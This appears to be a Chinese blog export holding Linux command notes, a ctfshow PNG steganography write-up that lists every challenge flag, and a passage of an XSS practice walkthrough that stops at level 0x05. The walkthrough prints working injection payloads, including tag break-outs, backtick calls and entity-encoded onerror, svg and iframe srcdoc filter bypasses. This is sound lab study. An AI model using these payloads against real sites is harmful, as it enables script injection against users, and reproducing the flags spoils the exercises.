<p><img src="https://img-blog.csdnimg.cn/20210329181557589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><p>cut命令用于显示每行从开头算起到n的文字</p>
<pre><code>xxx | cut -b n
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20210329182933895.png" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>grep 命令用于查找文件里复合条件的字符串</p>
<pre><code>grep test *file
</code></pre>
<p>在当前目录中查找后缀有file的文件中的包含test字符串的文件并打印出该字符串所在的行数。</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="uniq（未完）"><a href="#uniq（未完）" class="headerlink" title="uniq（未完）"></a>uniq（未完）</h3><p>uniq命令用于检查及删除文本文件中重复出现的行列，一般与sort结合使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：uniq [选项]... [文件]</span><br><span class="line">Filter adjacent matching lines from INPUT (or standard input),</span><br><span class="line">writing to OUTPUT (or standard output).</span><br><span class="line"></span><br><span class="line">With no options, matching lines are merged to the first occurrence.</span><br><span class="line"></span><br><span class="line">必选参数对长短选项同时适用。</span><br><span class="line">  -c, --count           prefix lines by the number of occurrences</span><br><span class="line">  -d, --repeated        only print duplicate lines, one for each group</span><br><span class="line">  -D                    print all duplicate lines</span><br><span class="line">      --all-repeated[&#x3D;METHOD]  like -D, but allow separating groups</span><br><span class="line">                                 with an empty line;</span><br><span class="line">                                 METHOD&#x3D;&#123;none(default),prepend,separate&#125;</span><br><span class="line">  -f, --skip-fields&#x3D;N   avoid comparing the first N fields</span><br><span class="line">      --group[&#x3D;METHOD]  show all items, separating groups with an empty line;</span><br><span class="line">                          METHOD&#x3D;&#123;separate(default),prepend,append,both&#125;</span><br><span class="line">  -i, --ignore-case     ignore differences in case when comparing</span><br><span class="line">  -s, --skip-chars&#x3D;N    avoid comparing the first N characters</span><br><span class="line">  -u, --unique          only print unique lines</span><br><span class="line">  -z, --zero-terminated     line delimiter is NUL, not newline</span><br><span class="line">  -w, --check-chars&#x3D;N	对每行第N 个字符以后的内容不作对照</span><br><span class="line">      --help		显示此帮助信息并退出</span><br><span class="line">      --version		显示版本信息并退出</span><br><span class="line">若域中为先空字符(通常包括空格以及制表符)，然后非空字符，域中字符前的空字符将被跳过。</span><br></pre></td></tr></table></figure>



<p><img src="https://img-blog.csdnimg.cn/20210329223625475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p>strings打印文件中可打印的字符，可以是文本文件(test.c)、可执行文件、动态链接库、静态链接库。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用法：strings [选项] [文件]</span><br><span class="line"> 打印 [文件] (默认为标准输入) 中可打印的字符串</span><br><span class="line"> 选项为：</span><br><span class="line">  -a - --all                Scan the entire file, not just the data section [default]</span><br><span class="line">  -d --data                 Only scan the data sections in the file</span><br><span class="line">  -f --print-file-name      Print the name of the file before each string</span><br><span class="line">  -n --bytes&#x3D;[number]       Locate &amp; print any NUL-terminated sequence of at</span><br><span class="line">  -&lt;number&gt;                   least [number] characters (default 4).</span><br><span class="line">  -t --radix&#x3D;&#123;o,d,x&#125;        Print the location of the string in base 8, 10 or 16</span><br><span class="line">  -w --include-all-whitespace Include all whitespace as valid string characters</span><br><span class="line">  -o                        An alias for --radix&#x3D;o</span><br><span class="line">  -T --target&#x3D;&lt;BFDNAME&gt;     Specify the binary file format</span><br><span class="line">  -e --encoding&#x3D;&#123;s,S,b,l,B,L&#125; Select character size and endianness:</span><br><span class="line">                            s &#x3D; 7-bit, S &#x3D; 8-bit, &#123;b,l&#125; &#x3D; 16-bit, &#123;B,L&#125; &#x3D; 32-bit</span><br><span class="line">  -s --output-separator&#x3D;&lt;string&gt; String used to separate strings in output.</span><br><span class="line">  @&lt;file&gt;                   Read options from &lt;file&gt;</span><br><span class="line">  -h --help                 Display this information</span><br><span class="line">  -v -V --version           Print the program&#39;s version number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strings：支持的目标： elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 a.out-i386-linux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 plugin srec symbolsrec verilog tekhex binary ihex</span><br></pre></td></tr></table></figure>


<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h3><p>rev 命令将文件中的每行内容以字符为单位反序输出。<br><img src="https://img-blog.csdnimg.cn/20210329224438294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>用法：rev [选项] [文件 ...]

对成行的内容逐字翻转。

选项：
 -h, --help     display this help
 -V, --version  display version
</code></pre>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>zip是个使用广泛的压缩程序，压缩后文件后缀为.zip<br><img src="https://img-blog.csdnimg.cn/20210329224829907.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Copyright (c) 1990-2008 Info-ZIP - Type &#39;zip &quot;-L&quot;&#39; for software license.</span><br><span class="line">Zip 3.0 (July 5th 2008). Usage:</span><br><span class="line">zip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]</span><br><span class="line">  The default action is to add or replace zipfile entries from list, which</span><br><span class="line">  can include the special name - to compress standard input.</span><br><span class="line">  If zipfile and list are omitted, zip compresses stdin to stdout.</span><br><span class="line">  -f   freshen: only changed files  -u   update: only changed or new files</span><br><span class="line">  -d   delete entries in zipfile    -m   move into zipfile (delete OS files)</span><br><span class="line">  -r   recurse into directories     -j   junk (don&#39;t record) directory names</span><br><span class="line">  -0   store only                   -l   convert LF to CR LF (-ll CR LF to LF)</span><br><span class="line">  -1   compress faster              -9   compress better</span><br><span class="line">  -q   quiet operation              -v   verbose operation&#x2F;print version info</span><br><span class="line">  -c   add one-line comments        -z   add zipfile comment</span><br><span class="line">  -@   read names from stdin        -o   make zipfile as old as latest entry</span><br><span class="line">  -x   exclude the following names  -i   include only the following names</span><br><span class="line">  -F   fix zipfile (-FF try harder) -D   do not add directory entries</span><br><span class="line">  -A   adjust self-extracting exe   -J   junk zipfile prefix (unzipsfx)</span><br><span class="line">  -T   test zipfile integrity       -X   eXclude eXtra file attributes</span><br><span class="line">  -y   store symbolic links as the link instead of the referenced file</span><br><span class="line">  -e   encrypt                      -n   don&#39;t compress these suffixes</span><br><span class="line">  -h2  show more help</span><br></pre></td></tr></table></figure>


<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="ls-al"><a href="#ls-al" class="headerlink" title="ls -al"></a>ls -al</h3><p><img src="https://img-blog.csdnimg.cn/20210329224947182.png" alt="在这里插入图片描述"><br>Linux系统中分为三种用户：<br>用户组，其他组，root。root可以在任何地方访问任何数据。默认情况下，所有系统上的账号与一般身份用户，root的相关信息都记录在/etc/passwd这个文件中；个人密码则记录在/etc/shadow这个文件中，此外Linux所有组名都记录在/etc/group中。</p>
<p>第一个字符表示的文件的种类：<br>1、d是目录<br>2、-是文件<br>3、|是链接文件<br>4、b设备文件里面可供储存的周边设备<br>5、c表示设备文件里边的串行端口设备<br>第一组rwx表示拥有者可具备的权限<br>第二组rwx表示用户组账号的权限<br>第三组rwx表示其他者的权限<br>//默认root用户都可以进行读写<br>第二栏 1表示有多少文件链接到此节点上<br>第三栏记录文件拥有者<br>第四栏记录文件拥有组<br>第五栏记录文件大小<br>第六栏记录时间<br>第七栏记录文件名，如果文件名之前多一个-，则表示这个文件是隐藏文件.</p>
]]></content>
      <categories>
        <category>linux命令</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow misc入门 png隐写入门</title>
    <url>/2021/06/03/png%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h2 id="One-PieNG-1"><a href="#One-PieNG-1" class="headerlink" title="One PieNG 1"></a>One PieNG 1</h2><p>附件的文件名就是flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#St4rt_fr0m_th1s_5tr1ng#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-2"><a href="#One-PieNG-2" class="headerlink" title="One PieNG 2"></a>One PieNG 2</h2><p>图片上的字符串即为flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#Th1s_i5_s0_34sy!!!#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-3"><a href="#One-PieNG-3" class="headerlink" title="One PieNG 3"></a>One PieNG 3</h2><p>修改图片高度得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#Pn9_He1gh7_6e_ch4ng3d#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-4"><a href="#One-PieNG-4" class="headerlink" title="One PieNG 4"></a>One PieNG 4</h2><p>依旧是修改图片高度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#M4yb3_we_sh0uld_9o_d33per#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-5"><a href="#One-PieNG-5" class="headerlink" title="One PieNG 5"></a>One PieNG 5</h2><p>用stegsolve打开原附件</p>
<p><img src="https://img.vim-cn.com/c3/72ce354cbf712a710dec421a7e470f87159086.png"></p>
<p>b通道最低为隐写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#You_st3gs0lved_me!!!#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-6"><a href="#One-PieNG-6" class="headerlink" title="One PieNG 6"></a>One PieNG 6</h2><p>LSB隐写</p>
<p>stegsolve的<code>data extract</code>模块</p>
<p><img src="https://img.vim-cn.com/86/0cde27dfef2bc1979a8e955c4d3c059edbdb0f.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#LSB_1s_v3ry_e4sy_righ7?#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-7"><a href="#One-PieNG-7" class="headerlink" title="One PieNG 7"></a>One PieNG 7</h2><p>尝试一波column，最终在R、G的0通道找到了</p>
<p><img src="https://img.vim-cn.com/ed/718595e0ec75cbae3d1343676d20eebf95b181.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#5omet1mes_LSB_g0es_co1omn_f1r5t#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-8"><a href="#One-PieNG-8" class="headerlink" title="One PieNG 8"></a>One PieNG 8</h2><p>看到R、G、B的7通道左上角都有点问题，尝试一波</p>
<p><img src="https://img.vim-cn.com/0f/7bca231de81d46a42929d992eec12e7bf4338c.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#zsteg_do35_no7_a1w4ys_w0rk#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-9"><a href="#One-PieNG-9" class="headerlink" title="One PieNG 9"></a>One PieNG 9</h2><p>可以发现在 每一个色道的0通道上的左上角都有一段lsb隐写，而在1、2通道上的比0通道上的还要长</p>
<p><img src="https://img.vim-cn.com/25/6caa75c51b70da4ca02a4ec1ace65a4b88d8af.png"></p>
<p>看到PK直接save bin 存为zip文件</p>
<p>打开压缩包里边有个txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#Wh4t_1s_6it_0rder_4nd_y0u_c4n_LSB_b1nd4ta_to0#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-10"><a href="#One-PieNG-10" class="headerlink" title="One PieNG 10"></a>One PieNG 10</h2><p>010editor打开找到flag</p>
<p><img src="https://img.vim-cn.com/92/a2c17c59722a424eb306fd91a8dc35c0f083b4.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#A_k3y_1n_exif#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-11"><a href="#One-PieNG-11" class="headerlink" title="One PieNG 11"></a>One PieNG 11</h2><p>查看图片的exif   <a href="https://exif.tuchong.com/">在线网站</a></p>
<table>
<thead>
<tr>
<th>XMP-photoshop</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>DocumentAncestors</td>
<td>23415F6B65795F6672306D5F50683074307368307023</td>
</tr>
<tr>
<td>城市</td>
<td>b58/3AjtPrXQJuhFwguK7nqu4ZpsqMLwU</td>
</tr>
</tbody></table>
<p>将城市对应的值进行<a href="http://ctf.ssleye.com/base58w.html">base58解码</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#An0th3r_key_1n_3xif#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-12"><a href="#One-PieNG-12" class="headerlink" title="One PieNG 12"></a>One PieNG 12</h2><p>查看图片的exif   <a href="https://exif.tuchong.com/">在线网站</a></p>
<table>
<thead>
<tr>
<th>XMP-photoshop</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>DocumentAncestors</td>
<td>23415F6B65795F6672306D5F50683074307368307023</td>
</tr>
<tr>
<td>城市</td>
<td>b58/3AjtPrXQJuhFwguK7nqu4ZpsqMLwU</td>
</tr>
</tbody></table>
<p>第一行<a href="http://stool.chinaz.com/hex">hex解码</a>即可得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#A_key_fr0m_Ph0t0sh0p#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-13"><a href="#One-PieNG-13" class="headerlink" title="One PieNG 13"></a>One PieNG 13</h2><p>用010打开</p>
<p><img src="https://img.vim-cn.com/8e/a91937838691be035bea2119d91ebbfab7782b.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#Ju5t_a_1one1y_tEXt_chunk#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-14"><a href="#One-PieNG-14" class="headerlink" title="One PieNG 14"></a>One PieNG 14</h2><p>用<a href="https://github.com/rvong/png-debugger">PNGDebugger</a>跑了一下，发现前九个IDAT块错误，用<a href="http://t0mrvvi1b3t.top/2021/05/03/%E5%B7%A5%E5%85%B7/">tweakpng</a>删除掉前九个IDAT块即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#eXtr4_IDAT_of_an0th3r_Pn9#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-15"><a href="#One-PieNG-15" class="headerlink" title="One PieNG 15"></a>One PieNG 15</h2><p>扔kali中 binwalk命令来分离</p>
<p>考点 zlib压缩数据 （<a href="https://blog.csdn.net/qq_40574571/article/details/80164981">有关知识</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#IDAT_i5_a_z1ib_p4cka9e#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-16"><a href="#One-PieNG-16" class="headerlink" title="One PieNG 16"></a>One PieNG 16</h2><p>这个真的，好阴间哟，我人麻了…..</p>
<p>pngdebugger分析图片，前九个出错的IDAT块的crc-code加起来就是flag……</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0000028D      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x00000291      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x00010295      crc-code&#x3D;0x00234831</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x94F55588         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x00010299      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x0001029D      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000202A1      crc-code&#x3D;0x0064655F</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0xBA2406E1         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000202A5      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000202A9      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000302AD      crc-code&#x3D;0x00683378</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0xCD6A57C7         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000302B1      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000302B5      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000402B9      crc-code&#x3D;0x00643437</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x9EC196CD         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000402BD      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000402C1      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000502C5      crc-code&#x3D;0x00615F31</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x1D1C51CC         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000502C9      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000502CD      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000602D1      crc-code&#x3D;0x006E5F63</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0xD41FCAD9         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000602D5      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000602D9      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000702DD      crc-code&#x3D;0x0068756E</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x655D563D         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000702E1      chunk-length&#x3D;0x00010000 (65536)</span><br><span class="line">0x000702E5      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x000802E9      crc-code&#x3D;0x006B5F43</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0xCB1875FD         &#x3D;&gt;      CRC FAILED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x000802ED      chunk-length&#x3D;0x00002646 (9798)</span><br><span class="line">0x000802F1      chunk-type&#x3D;&#39;IDAT&#39;</span><br><span class="line">0x0008293B      crc-code&#x3D;0x00524323</span><br><span class="line">&gt;&gt; (CRC CHECK)  crc-computed&#x3D;0x19FE70D3         &#x3D;&gt;      CRC FAILED</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23483164655F683378643437615F316E5F6368756E6B5F43524323</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;hex解码后</span><br><span class="line"></span><br><span class="line">#H1de_h3xd47a_1n_chunk_CRC#</span><br><span class="line"></span><br><span class="line">flag：</span><br><span class="line">ctfshow&#123;#H1de_h3xd47a_1n_chunk_CRC#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-17"><a href="#One-PieNG-17" class="headerlink" title="One PieNG 17"></a>One PieNG 17</h2><p>010打开，图片的尾部</p>
<p><img src="https://img.vim-cn.com/93/0ee9e002071fbec36c244b259fa81ec5b0f555.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#HexEditor_wi11_b3_he1pfu1#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-18"><a href="#One-PieNG-18" class="headerlink" title="One PieNG 18"></a>One PieNG 18</h2><p>用foremost分离出来的东西中有个图片</p>
<p><img src="https://img.vim-cn.com/52/5bd582f0dffcb261dc5baa853886296389ac52.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#He110_I_4m_Tw0_PieNG#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;套娃终有报，天道好轮回。不信抬头看，苍天饶过谁。&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>png隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-haizi-me通关记录</title>
    <url>/2021/04/29/xss-haizi-me/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p><strong>server code:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p><strong>server code:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/textarea&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关插入的地方在html标签里面，所以要先闭合<code>&lt;textarea&gt;</code>标签<br><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>input的地方在尖括号内部，需要先闭合尖括号<br><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>



<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关用正则表达式过滤了括号（替换为空），这里有个小tip，可以用反引号代替圆括号。</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/c3/1ff93a7abd8403678cc1e62c85f435c1c0aa06.png" alt="p1"></p>
<p><img src="https://img.vim-cn.com/b9/4133905d8213afd6571cb03e31c0b7b5248470.png" alt="p2"></p>
<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了圆括号和反引号，所以上一关的方法就不能用了。</p>
<p>可以用各种编码进行绕过，如url编码、unicode编码…</p>
<ul>
<li><code>&lt;svg&gt;</code>标签中可以直接执行实体字符,payload2</li>
<li><img src="https://img.vim-cn.com/e4/9ee88d85f2dceafa213411c54c521fb389a413.png" alt="p3"></li>
<li>h5中<code>iframe</code>标签（iframe 元素会创建包含另外一个文档的内联框架）的<code>srcdoc</code>属性，<code>srcdoc</code>里的代码会作为<code>iframe</code>中的内容显示出来，<code>srcdoc</code>中可以直接去写转译后的html片段</li>
<li><img src="https://img.vim-cn.com/cc/661c5e22230e03c7067474a2d604098caa1753.png" alt="p4"></li>
<li><img src="https://img.vim-cn.com/ab/89644e07ed2733aa03748fbf35708ad771c071.png" alt="p5"></li>
</ul>
<p><strong>input code &amp; html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">&quot;javascript:alert%281%29&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p><strong>server code:</strong></p>
